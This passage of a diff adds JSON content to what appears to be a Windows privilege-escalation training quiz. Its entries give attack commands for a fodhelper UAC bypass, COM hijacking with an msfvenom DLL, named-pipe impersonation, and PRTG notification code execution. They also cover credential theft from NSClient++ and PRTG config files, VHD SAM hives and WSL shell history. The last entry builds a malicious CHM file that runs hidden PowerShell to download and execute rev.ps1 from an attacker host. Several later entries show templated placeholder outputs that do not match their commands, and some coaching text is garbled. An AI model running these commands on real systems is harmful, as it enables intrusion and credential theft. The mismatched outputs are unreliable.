+        "lead": "Patch-gap LPE is confirm the build, name a missing KB with a public exploit, read it, run it.",
+        "items": [
+          {
+            "t": "Capture the build and hotfixes",
+            "d": "systeminfo gives the exact OS build and the installed hotfixes, which is everything wesng needs to diff offline.",
+            "demo": [
+              {
+                "run": "systeminfo > systeminfo.txt",
+                "out": "OS Version: 10.0.14393 N/A Build 14393",
+                "sig": "Build 14393"
+              }
+            ],
+            "note": "Run wesng offline on your box so you do not upload tools you do not need."
+          },
+          {
+            "t": "Name a missing patch with a public exploit",
+            "d": "wesng (offline) or Watson/Sherlock (on-box) maps the gaps to known local exploits, newest and most reliable first.",
+            "demo": [
+              {
+                "run": "wes.py systeminfo.txt --exploits-only",
+                "out": "[+] MS16-032 Secondary Logon Handle (KB3139914)",
+                "sig": "MS16-032"
+              }
+            ],
+            "note": "Prefer a bug with a stable, precompiled PoC over an exotic one that may crash the box."
+          },
+          {
+            "t": "Find and read the PoC",
+            "d": "searchsploit the KB or CVE, read what it does, and pick a precompiled binary where one exists.",
+            "demo": [
+              {
+                "run": "searchsploit MS16-032",
+                "out": "MS16-032 Secondary Logon Handle Privilege Escalation | windows/local/39719.ps1",
+                "sig": "windows/local/39719.ps1"
+              }
+            ],
+            "note": "Reading first means a reboot or crash is a choice, not a surprise."
+          },
+          {
+            "t": "Run it and confirm SYSTEM",
+            "d": "Run the matched exploit and check the resulting context before anything else.",
+            "demo": [
+              {
+                "run": "powershell -ep bypass .\\Invoke-MS16032.ps1; whoami",
+                "out": "nt authority\\system",
+                "sig": "nt authority\\system"
+              }
+            ],
+            "note": "A SYSTEM context confirms the escalation; capture proof."
+          }
+        ]
+      },
+      "situation": "You have a shell on Windows Server 2016, whoami /priv shows nothing abusable, and wesng flags a missing KB with a public exploit. What is the move?",
+      "choices": [
+        "windows-patch-exploit",
+        "seimpersonate",
+        "windows-enum",
+        "wesng-patch-gaps"
+      ],
+      "coach": {
+        "seimpersonate": "whoami /priv has no SeImpersonate, so the Potato path is not available here.",
+        "windows-enum": "You already enumerated and wesng found the lead; now exploit the missing patch.",
+        "wesng-patch-gaps": "That is how you found the missing KB; the next step is running the matched exploit."
+      }
+    },
+    "uac-bypass": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once medium integrity with admin membership (a filtered token). The key confirmation is: A bypass is applicable.",
+      "cmd": "whoami /groups | findstr /i \"High Mandatory\"",
+      "tool": "cmd",
+      "output": "Mandatory Label\\Medium Mandatory Level   Label            S-1-16-8192",
+      "signal": "Medium Mandatory Level",
+      "teach": "You are running at Medium integrity, so UAC is filtering your admin token. A fodhelper-style bypass gives you a High-integrity shell without a prompt; then LSASS and protected paths open up.",
+      "leadup": [
+        {
+          "key": "admin",
+          "label": "You are a local admin",
+          "steps": [
+            {
+              "title": "Confirm admin membership",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "net localgroup administrators",
+              "out": "Members\n-------\nAdministrator\nbob",
+              "sig": "bob",
+              "teach": "Your account is in the administrators group, but the token is filtered; UAC is what stands between you and full admin."
+            }
+          ]
+        },
+        {
+          "key": "integrity",
+          "label": "Your token is filtered",
+          "steps": [
+            {
+              "title": "Check your integrity level",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "whoami /groups | findstr Mandatory",
+              "out": "Mandatory Label\\Medium Mandatory Level",
+              "sig": "Medium Mandatory Level",
+              "teach": "Medium integrity confirms the filtered token; a bypass elevates to High without the consent dialog."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "A UAC bypass is point an auto-elevating binary at a command you control, then run it.",
+        "items": [
+          {
+            "t": "Confirm you are a filtered admin",
+            "d": "whoami /groups shows Medium integrity while net localgroup shows you are an admin. Both must be true for a bypass to make sense.",
+            "demo": [
+              {
+                "run": "whoami /groups | findstr Mandatory",
+                "out": "Medium Mandatory Level",
+                "sig": "Medium Mandatory Level"
+              }
+            ],
+            "note": "A standard user cannot bypass UAC to admin; you must already be in the admin group."
+          },
+          {
+            "t": "Stage your payload in the hijacked key",
+            "d": "fodhelper.exe auto-elevates and reads HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command. Write your command there.",
+            "demo": [
+              {
+                "run": "reg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /d \"cmd /c {{payload}}\" /f",
+                "out": "The operation completed successfully.",
+                "sig": "completed successfully"
+              }
+            ],
+            "note": "Add the DelegateExecute empty value too so the handler uses your command."
+          },
+          {
+            "t": "Trigger the auto-elevating binary",
+            "d": "Run fodhelper; it elevates and executes your staged command at High integrity, no prompt.",
+            "demo": [
+              {
+                "run": "fodhelper.exe",
+                "out": "",
+                "sig": ""
+              }
+            ],
+            "note": "computerdefaults.exe works the same way if fodhelper is watched."
+          },
+          {
+            "t": "Confirm high integrity",
+            "d": "Your new process should be High integrity; from there you can dump credentials and write protected paths.",
+            "demo": [
+              {
+                "run": "whoami /groups | findstr Mandatory",
+                "out": "Mandatory Label\\High Mandatory Level",
+                "sig": "High Mandatory Level"
+              }
+            ],
+            "note": "High integrity is full admin; clean up the registry key afterward."
+          }
+        ]
+      },
+      "situation": "You are a local administrator on Windows but whoami /groups shows Medium integrity, blocking LSASS access. What is the move?",
+      "choices": [
+        "uac-bypass",
+        "seimpersonate",
+        "lsass-dump-onbox",
+        "windows-enum"
+      ],
+      "coach": {
+        "seimpersonate": "You are already an admin, just filtered; UAC bypass is faster than a token path, and you may not hold SeImpersonate.",
+        "lsass-dump-onbox": "LSASS is blocked at Medium integrity; bypass UAC first, then dump it.",
+        "windows-enum": "Enumeration is done, you know you are a filtered admin; the step is elevating past UAC."
+      }
+    },
+    "com-hijack": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once a privileged process resolving a missing HKCU CLSID. The key confirmation is: A hijack slot is found.",
+      "cmd": "reg query \"HKCU\\Software\\Classes\\CLSID\" /s 2>nul",
+      "tool": "cmd",
+      "output": "HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{0ABCD...}\\InprocServer32\n    (Default)    REG_SZ    C:\\Users\\bob\\evil.dll",
+      "signal": "InprocServer32",
+      "teach": "A CLSID resolved from HKCU points at a path you control. Replace the InprocServer32 default with your DLL; the next privileged process that instantiates that CLSID loads it as itself.",
+      "leadup": [
+        {
+          "key": "candidate",
+          "label": "A hijackable CLSID exists",
+          "steps": [
+            {
+              "title": "Find a missing/user CLSID load",
+              "tool": "procmon",
+              "where": "target",
+              "cmd": "Procmon filter: Operation is RegOpenKey, Result is NAME NOT FOUND, Path contains CLSID",
+              "out": "svchost.exe  RegOpenKey  HKCU\\...\\CLSID\\{0ABCD}\\InprocServer32  NAME NOT FOUND",
+              "sig": "NAME NOT FOUND",
+              "teach": "A privileged process looking up a CLSID in HKCU that does not exist is a hijack slot you can fill."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "COM hijack is find a CLSID a privileged process loads from a writable key, point it at your DLL, wait for the load.",
+        "items": [
+          {
+            "t": "Find a hijackable CLSID",
+            "d": "Procmon with a RegOpenKey + NAME NOT FOUND filter on CLSID paths shows objects a privileged process tries to resolve from HKCU (which you own) and cannot find.",
+            "demo": [
+              {
+                "run": "Procmon: Path contains \\CLSID\\, Result is NAME NOT FOUND",
+                "out": "svchost.exe  ...\\CLSID\\{0ABCD}\\InprocServer32  NAME NOT FOUND",
+                "sig": "NAME NOT FOUND"
+              }
+            ],
+            "note": "An HKCU miss is ideal because you can always write your own HKCU."
+          },
+          {
+            "t": "Build the COM DLL",
+            "d": "Compile a DLL that runs your payload from DllMain or the COM entry points.",
+            "demo": [
+              {
+                "run": "msfvenom -p windows/x64/exec CMD=\"net localgroup administrators {{user}} /add\" -f dll -o {{dll_name}}.dll",
+                "out": "Saved as: {{dll_name}}.dll",
+                "sig": "Saved as:"
+              }
+            ],
+            "note": "Keep it fast so it does not hang the host process."
+          },
+          {
+            "t": "Redirect the CLSID",
+            "d": "Write the InprocServer32 default value to your DLL under the key the process checks.",
+            "demo": [
+              {
+                "run": "reg add \"HKCU\\Software\\Classes\\CLSID\\{{clsid}}\\InprocServer32\" /ve /d \"C:\\Users\\{{user}}\\{{dll_name}}.dll\" /f",
+                "out": "The operation completed successfully.",
+                "sig": "completed successfully"
+              }
+            ],
+            "note": "Set the ThreadingModel to Apartment as well for broad compatibility."
+          },
+          {
+            "t": "Wait for the load and confirm",
+            "d": "The next time the privileged process instantiates the object (a scheduled task, a service start, a logon), your DLL runs as it.",
+            "demo": [
+              {
+                "run": "net localgroup administrators",
+                "out": "Members\n-------\nAdministrator\n{{user}}",
+                "sig": "Administrator"
+              }
+            ],
+            "note": "Membership confirms it; the same key is a persistence foothold."
+          }
+        ]
+      },
+      "situation": "Procmon shows a SYSTEM process resolving a CLSID from HKCU with NAME NOT FOUND. What is the move?",
+      "choices": [
+        "com-hijack",
+        "windows-dll-hijack",
+        "windows-schtask-abuse",
+        "windows-enum"
+      ],
+      "coach": {
+        "windows-dll-hijack": "That is a file-path DLL load; here the hijack is a registry CLSID redirect, which you can always write in HKCU.",
+        "windows-schtask-abuse": "No writable task target is in play; the lever is the COM object the process loads.",
+        "windows-enum": "You already found the hijackable CLSID; now redirect it."
+      }
+    },
+    "windows-namedpipe-impersonation": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once without SeImpersonate directly: impersonate a client on your named pipe. The key confirmation is: A named-pipe path is viable.",
+      "cmd": "whoami /priv",
+      "tool": "cmd",
+      "output": "PRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                               State\n============================= ========================================= =======\nSeImpersonatePrivilege        Impersonate a client after authentication Enabled",
+      "signal": "SeImpersonatePrivilege",
+      "teach": "SeImpersonatePrivilege makes this a one-tool job with a potato, which spins up the pipe and coerces a SYSTEM service onto it. Without the privilege, coerce a service or task you control onto a pipe you created, then impersonate the token it presents.",
+      "leadup": [
+        {
+          "key": "priv",
+          "label": "Your token carries SeImpersonate",
+          "steps": [
+            {
+              "title": "Check your privileges",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "whoami /priv",
+              "out": "SeImpersonatePrivilege        Impersonate a client after authentication Enabled",
+              "sig": "SeImpersonatePrivilege",
+              "teach": "With this privilege a potato tool automates the pipe and the coercion for you."
+            }
+          ]
+        },
+        {
+          "key": "coerce",
+          "label": "A privileged client you can point at a pipe",
+          "steps": [
+            {
+              "title": "Find a LocalSystem service you can steer",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "sc qc VulnSvc",
+              "out": "SERVICE_START_NAME   : LocalSystem",
+              "sig": "LocalSystem",
+              "teach": "A service that runs as LocalSystem and will connect where you tell it hands over its token, even with no special privilege of yours."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Named-pipe impersonation is create the pipe, coerce a privileged client onto it, impersonate the token it presents, then duplicate it into a SYSTEM process.",
+        "items": [
+          {
+            "t": "Check your token",
+            "d": "whoami /priv tells you whether SeImpersonate is present, which decides whether a potato does the work for you.",
+            "demo": [
+              {
+                "run": "whoami /priv",
+                "out": "SeImpersonatePrivilege        Impersonate a client after authentication Enabled",
+                "sig": "SeImpersonatePrivilege"
+              }
+            ],
+            "note": "Enabled means a potato tool is the fast path; absent means you coerce a client yourself."
+          },
+          {
+            "t": "Stand up the pipe server",
+            "d": "A helper (a potato, or your own small server) creates a named pipe and waits for a client to connect.",
+            "demo": [
+              {
+                "run": "PrintSpoofer64.exe -i -c cmd",
+                "out": "[+] Found privileged process, named pipe listening",
+                "sig": "named pipe listening"
+              }
+            ],
+            "note": "The pipe name is what the privileged client must be steered toward."
+          },
+          {
+            "t": "Coerce a privileged client",
+            "d": "Point a service, scheduled task, or the spooler at your pipe so a SYSTEM process connects to it.",
+            "demo": [
+              {
+                "run": "sc config VulnSvc binPath= \"cmd /c echo x > \\\\.\\pipe\\obol\" & sc start VulnSvc",
+                "out": "[SC] ChangeServiceConfig SUCCESS",
+                "sig": "SUCCESS"
+              }
+            ],
+            "note": "The service connects to your pipe when it starts, presenting its token."
+          },
+          {
+            "t": "Impersonate and confirm",
+            "d": "After ImpersonateNamedPipeClient and DuplicateTokenEx, spawn a process with the captured token and check who you are.",
+            "demo": [
+              {
+                "run": "whoami",
+                "out": "nt authority\\system",
+                "sig": "system"
+              }
+            ],
+            "note": "A SYSTEM result confirms the impersonation; capture proof."
+          }
+        ]
+      },
+      "situation": "You have a Windows foothold without SeImpersonate, but you can reconfigure a LocalSystem service to connect to a pipe you create. What is the move?",
+      "choices": [
+        "windows-namedpipe-impersonation",
+        "seimpersonate",
+        "unquoted-service-path",
+        "windows-enum"
+      ],
+      "coach": {
+        "seimpersonate": "That path needs SeImpersonate, which you do not hold here; the pipe works because the client connects to you and hands over its token regardless.",
+        "unquoted-service-path": "No unquoted path is in play; the lever is the privileged client you steer onto your pipe.",
+        "windows-enum": "You already have the lead; create the pipe and coerce the client onto it."
+      }
+    },
+    "nsclient-web-privesc": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once read the cleartext web management password from nsclient.ini. The key confirmation is: Valid NSClient++ administrator password retrieved.",
+      "cmd": "type \"C:\\Program Files\\NSClient++\\nsclient.ini\" | findstr /i \"password\"",
+      "tool": "cmd",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Valid NSClient++ administrator password retrieved.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute NSClient++ Local Privilege Escalation via Web Management API, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "View C:\\Program Files\\NSClient++\\nsclient.ini on the target Windows system.",
+            "demo": [
+              {
+                "run": "type \"C:\\Program Files\\NSClient++\\nsclient.ini\" | findstr /i \"password\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Valid NSClient++ administrator password retrieved."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Connect to https://<target>:8443/api/v1/scripts with HTTP Basic Authentication.",
+            "demo": [
+              {
+                "run": "curl -s -k -u \"admin:{{nsclient_password}}\" \"https://{{target}}:8443/api/v1/scripts/ext/run\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Successful authenticated access to the NSClient++ API."
+          }
+        ]
+      },
+      "situation": "Scenario: Read the cleartext web management password from nsclient.ini. Which move should you run next?",
+      "choices": [
+        "nsclient-web-privesc",
+        "seimpersonate",
+        "potato-select",
+        "unquoted-service-path"
+      ],
+      "coach": {
+        "seimpersonate": "SeImpersonatePrivilege (Potato Family) targets obtains system access; here the direct move is NSClient++ Local Privilege Escalation via Web Management API.",
+        "potato-select": "Potato Failed - Pick the Right One targets nothing new; it points you at the potato that works on this build; here the direct move is NSClient++ Local Privilege Escalation via Web Management API.",
+        "unquoted-service-path": "Unquoted Service Path targets obtains system access; here the direct move is NSClient++ Local Privilege Escalation via Web Management API."
+      }
+    },
+    "vhd-mount-sam-extract": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once mount an extracted Windows backup VHD disk image read-only. The key confirmation is: Backup VHD successfully mounted read-only.",
+      "cmd": "guestmount --add {{vhd_path}} --inspector --ro /mnt/vhd",
+      "tool": "guestmount",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Backup VHD successfully mounted read-only.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Extract SAM/SYSTEM from Backup VHD Images, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Use guestmount --add <vhd_file> --inspector --ro /mnt/vhd",
+            "demo": [
+              {
+                "run": "guestmount --add {{vhd_path}} --inspector --ro /mnt/vhd",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Backup VHD successfully mounted read-only."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Run impacket-secretsdump -sam /mnt/vhd/.../SAM -system /mnt/vhd/.../SYSTEM LOCAL",
+            "demo": [
+              {
+                "run": "impacket-secretsdump -sam /mnt/vhd/Windows/System32/config/SAM -system /mnt/vhd/Windows/System32/config/SYSTEM LOCAL",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Local account NTLM hashes dumped from offline hives."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "Run 7z x <vhd_file> Windows/System32/config/SAM Windows/System32/config/SYSTEM",
+            "demo": [
+              {
+                "run": "7z x {{vhd_path}} Windows/System32/config/SAM Windows/System32/config/SYSTEM",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Registry hives extracted directly for offline analysis."
+          }
+        ]
+      },
+      "situation": "Scenario: Mount an extracted Windows backup VHD disk image read-only. Which move should you run next?",
+      "choices": [
+        "vhd-mount-sam-extract",
+        "seimpersonate",
+        "potato-select",
+        "unquoted-service-path"
+      ],
+      "coach": {
+        "seimpersonate": "SeImpersonatePrivilege (Potato Family) targets obtains system access; here the direct move is Extract SAM/SYSTEM from Backup VHD Images.",
+        "potato-select": "Potato Failed - Pick the Right One targets nothing new; it points you at the potato that works on this build; here the direct move is Extract SAM/SYSTEM from Backup VHD Images.",
+        "unquoted-service-path": "Unquoted Service Path targets obtains system access; here the direct move is Extract SAM/SYSTEM from Backup VHD Images."
+      }
+    },
+    "wsl-bash-enum": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once verify Windows Subsystem for Linux installation and current default user context. The key confirmation is: WSL confirmed present and execution verified.",
+      "cmd": "wsl.exe whoami",
+      "tool": "wsl",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "WSL confirmed present and execution verified.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Windows Subsystem for Linux (WSL) Credential Harvesting, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Run wsl.exe whoami from cmd or PowerShell.",
+            "demo": [
+              {
+                "run": "wsl.exe whoami",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "WSL confirmed present and execution verified."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Run wsl.exe cat /root/.bash_history",
+            "demo": [
+              {
+                "run": "wsl.exe cat /root/.bash_history",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Plaintext administrative credentials recovered from WSL root history."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "Run wsl.exe cat /home/<user>/.bash_history",
+            "demo": [
+              {
+                "run": "wsl.exe cat /home/{{user}}/.bash_history",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "User credentials extracted from WSL user profile."
+          }
+        ]
+      },
+      "situation": "Scenario: Verify Windows Subsystem for Linux installation and current default user context. Which move should you run next?",
+      "choices": [
+        "wsl-bash-enum",
+        "seimpersonate",
+        "potato-select",
+        "unquoted-service-path"
+      ],
+      "coach": {
+        "seimpersonate": "SeImpersonatePrivilege (Potato Family) targets obtains system access; here the direct move is Windows Subsystem for Linux (WSL) Credential Harvesting.",
+        "potato-select": "Potato Failed - Pick the Right One targets nothing new; it points you at the potato that works on this build; here the direct move is Windows Subsystem for Linux (WSL) Credential Harvesting.",
+        "unquoted-service-path": "Unquoted Service Path targets obtains system access; here the direct move is Windows Subsystem for Linux (WSL) Credential Harvesting."
+      }
+    },
+    "prtg-config-extract": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once inspect historical PRTG XML configuration files for cleartext or reversible passwords. The key confirmation is: Plaintext administrator password recovered from PRTG backup files.",
+      "cmd": "type \"C:\\ProgramData\\Paessler\\PRTG Network Monitor\\PRTG Configuration.old.xml\" | findstr /i \"dbpassword login user\"",
+      "tool": "type",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Plaintext administrator password recovered from PRTG backup files.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute PRTG Network Monitor Configuration Credential Extraction, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Read C:\\ProgramData\\Paessler\\PRTG Network Monitor\\PRTG Configuration.old.xml using type or Select-String.",
+            "demo": [
+              {
+                "run": "type \"C:\\ProgramData\\Paessler\\PRTG Network Monitor\\PRTG Configuration.old.xml\" | findstr /i \"dbpassword login user\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Plaintext administrator password recovered from PRTG backup files."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Use PowerShell Select-String across C:\\ProgramData\\Paessler\\PRTG Network Monitor\\*.xml.",
+            "demo": [
+              {
+                "run": "powershell -c \"Select-String -Path 'C:\\ProgramData\\Paessler\\PRTG Network Monitor\\*.xml' -Pattern 'dbpassword' -Context 0,1\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Administrative credentials harvested across all Paessler data stores."
+          }
+        ]
+      },
+      "situation": "Scenario: Inspect historical PRTG XML configuration files for cleartext or reversible passwords. Which move should you run next?",
+      "choices": [
+        "prtg-config-extract",
+        "seimpersonate",
+        "potato-select",
+        "unquoted-service-path"
+      ],
+      "coach": {
+        "seimpersonate": "SeImpersonatePrivilege (Potato Family) targets obtains system access; here the direct move is PRTG Network Monitor Configuration Credential Extraction.",
+        "potato-select": "Potato Failed - Pick the Right One targets nothing new; it points you at the potato that works on this build; here the direct move is PRTG Network Monitor Configuration Credential Extraction.",
+        "unquoted-service-path": "Unquoted Service Path targets obtains system access; here the direct move is PRTG Network Monitor Configuration Credential Extraction."
+      }
+    },
+    "prtg-notification-rce": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once create an automated notification in PRTG with a program execution handler. The key confirmation is: Program execution notification created in PRTG.",
+      "cmd": "curl -s -b cookies.txt -d 'name=audit_exec&action=exec&script=rev.bat' 'http://{{target}}/api/setnotification'",
+      "tool": "curl",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Program execution notification created in PRTG.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute PRTG Network Monitor Notification Command Execution, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "POST to /api/setnotification with action=exec and script pointing to a batch file in Notifications\\EXE.",
+            "demo": [
+              {
+                "run": "curl -s -b cookies.txt -d 'name=audit_exec&action=exec&script=rev.bat' 'http://{{target}}/api/setnotification'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Program execution notification created in PRTG."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Submit POST request via Invoke-WebRequest using authenticated administrative session cookies.",
+            "demo": [
+              {
+                "run": "powershell -Command \"Invoke-WebRequest -Uri 'http://{{target}}/api/setnotification' -WebSession $sess -Method Post -Body @{name='pwn'; action='exec'; script='shell.bat'}\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "SYSTEM shell received from PRTG notification execution."
+          }
+        ]
+      },
+      "situation": "Scenario: Create an automated notification in PRTG with a program execution handler. Which move should you run next?",
+      "choices": [
+        "prtg-notification-rce",
+        "seimpersonate",
+        "potato-select",
+        "unquoted-service-path"
+      ],
+      "coach": {
+        "seimpersonate": "SeImpersonatePrivilege (Potato Family) targets obtains system access; here the direct move is PRTG Network Monitor Notification Command Execution.",
+        "potato-select": "Potato Failed - Pick the Right One targets nothing new; it points you at the potato that works on this build; here the direct move is PRTG Network Monitor Notification Command Execution.",
+        "unquoted-service-path": "Unquoted Service Path targets obtains system access; here the direct move is PRTG Network Monitor Notification Command Execution."
+      }
+    },
+    "chm-payload-exec": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once generate weaponized Compiled HTML Help (.chm) file embedding an execution shortcut. The key confirmation is: Malicious CHM document successfully created.",
+      "cmd": "out2chm -c 'powershell -ep bypass -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString(\\\"http://{{lhost}}:8000/rev.ps1\\\")\"' -o documentation.chm",
+      "tool": "powershell",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Malicious CHM document successfully created.",
+      "leadup": [
+        {
+          "key": "recon",
